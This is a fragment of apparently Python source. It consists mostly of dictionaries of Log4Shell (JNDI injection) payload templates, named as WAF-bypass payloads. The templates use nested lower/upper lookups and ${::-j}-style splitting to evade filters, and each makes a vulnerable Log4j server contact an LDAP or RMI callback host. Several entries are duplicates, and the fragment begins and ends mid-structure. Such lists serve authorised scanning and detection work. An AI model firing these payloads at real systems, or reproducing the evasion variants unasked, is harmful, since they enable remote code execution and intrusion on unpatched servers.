...
waf_bypass_payloads = {
  ...
  "pl2": "${jndi:rmi://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl3": "${${lower:jndi}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  ...
  "pl7": "${jndi:ldap://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}"
}


waf_bypass_payloads2 = {
  "pl0": "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl1": "${${::-j}ndi:rmi://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl2": "${jndi:rmi://{{verb}}.${main:0}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl3": "${${lower:jndi}:${lower:rmi}://{{verb}}.${main:0}{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl4": "${${lower:${lower:jndi}}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl5": "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl6": "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl7": "${jndi:ldap://${main:0}{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl8": "${jndi:ldap://${main:0}{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl9": "${jndi:ldap://${main:0}{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl10": "${jndi:ldap://${main:0}{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pl11": "${jndi:ldap://${main:0}{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pla": "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "plb": "${${::-j}ndi:rmi://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "plc": "${jndi:rmi://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "pld": "${${lower:jndi}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "ple": "${${lower:${lower:jndi}}:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "plf": "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "plg": "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}",
  "plh": "${jndi:ldap://{{verb}}.{{var}}.{{pvar}}.{{header_id}}.{{callback_host}}}"
